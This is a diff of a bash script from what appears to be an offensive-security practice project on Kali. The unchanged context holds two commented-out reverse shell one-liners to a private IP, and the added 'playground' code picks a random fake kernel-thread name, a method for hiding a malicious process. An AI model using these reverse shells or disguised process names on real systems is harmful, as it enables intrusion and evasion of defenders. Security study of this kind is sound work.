@@ -52,4 +52,16 @@ source "/home/kali/Projects/Black-Hat-Bash/SETUP/pentest.sh"
 #nohup nc 172.16.10.1 1111 -e /bin/bash &
 #bash -c 'bash -i >& /dev/tcp/172.16.10.1/1111 0>&1'
 
+# Set up local server
+# python -m http.server 8080 &
+
 # Playground
+
+RANDOM_BIN_NAMES=("[cpuhp/0]" "[khungtaskd]" "[blkcg_punt_biio]" "[ipv8_addrconf]" "[mlb]" "[kstrrp]" "[neetns]" "[rcu_gb]")
+rnd=$RANDOM
+RANDOMIZE=$((rnd % 7))
+BIN_FILE="${RANDOM_BIN_NAMES[${RANDOMIZE}]}"
+echo "$rnd"
+echo "$RANDOMIZE"
+echo "$BIN_FILE"
+basename "$0"
